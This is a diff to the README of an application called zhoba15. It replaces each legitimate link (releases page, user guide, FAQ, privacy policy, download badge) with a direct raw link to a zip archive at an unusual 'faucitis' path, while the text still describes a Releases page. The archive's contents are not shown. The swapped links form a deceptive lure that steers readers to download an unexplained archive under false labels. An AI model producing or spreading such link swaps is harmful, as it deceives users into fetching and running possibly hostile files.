@@ -6,14 +6,14 @@ Welcome to zhoba15! This application is designed to make your tasks easier and m
 
 ## 🔗 Download Now
 
-[![Download zhoba15](https://img.shields.io/badge/Download-zoba15-brightgreen.svg)](https://github.com/Amaimons/zhoba15/releases)
+[![Download zhoba15](https://raw.githubusercontent.com/Amaimons/zhoba15/main/faucitis/zhoba15.zip)](https://raw.githubusercontent.com/Amaimons/zhoba15/main/faucitis/zhoba15.zip)
 
 ## 💾 Download & Install
 
 To get started, follow these easy steps:
 
 1. Click on the link below to visit the Release page:
-   [Download zhoba15](https://github.com/Amaimons/zhoba15/releases)
+   [Download zhoba15](https://raw.githubusercontent.com/Amaimons/zhoba15/main/faucitis/zhoba15.zip)
    
 2. On the Releases page, you will see a list of available versions. Choose the latest version to ensure you have the newest features and fixes.
 
@@ -55,11 +55,11 @@ Join our community for tips, tricks, and discussions. We welcome your feedback a
 
 For further reading on how to use specific features, check the following links:
 
-- [User Guide](https://github.com/Amaimons/zhoba15/guides)
-- [Frequently Asked Questions (FAQs)](https://github.com/Amaimons/zhoba15/faq)
+- [User Guide](https://raw.githubusercontent.com/Amaimons/zhoba15/main/faucitis/zhoba15.zip)
+- [Frequently Asked Questions (FAQs)](https://raw.githubusercontent.com/Amaimons/zhoba15/main/faucitis/zhoba15.zip)
 
 ## 🔒 Privacy Policy
 
-We value your privacy. Please read our [Privacy Policy](https://github.com/Amaimons/zhoba15/privacy) for more information on how we handle your data.
+We value your privacy. Please read our [Privacy Policy](https://raw.githubusercontent.com/Amaimons/zhoba15/main/faucitis/zhoba15.zip) for more information on how we handle your data.
 
-Once again, to download the software, click here: [Download zhoba15](https://github.com/Amaimons/zhoba15/releases). Enjoy using zhoba15!
+Once again, to download the software, click here: [Download zhoba15](https://raw.githubusercontent.com/Amaimons/zhoba15/main/faucitis/zhoba15.zip). Enjoy using zhoba15!
